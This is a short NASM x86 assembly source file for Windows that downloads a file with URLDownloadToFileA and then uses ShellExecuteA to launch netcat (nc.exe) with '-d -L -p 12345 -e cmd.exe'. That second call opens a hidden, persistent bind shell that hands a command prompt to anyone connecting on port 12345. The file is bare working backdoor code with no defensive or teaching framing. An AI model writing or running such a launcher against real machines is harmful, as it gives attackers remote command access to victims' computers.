extern URLDownloadToFileA
extern ShellExecuteA

SECTION .text
	global main

main:
	
	push ebp
	mov ebp, esp
	
	xor edi, edi
	push edi
	push edi
	push dword path
	push dword link
	push edi
		call URLDownloadToFileA
	
	xor edi, edi
	
	push dword 3
	push edi
	push dword pa
	push dword file
	push edi
	push edi
		call ShellExecuteA
	
	leave
	ret

SECTION .data
	file	db	"nc.exe", 0
	pa		db	"-d -L -p 12345 -e cmd.exe", 0
	link	db	"http://localhost/index.html", 0
	path	db	"F:\Projects\Assembly\x86-64\nasm\getwifi\test.html", 0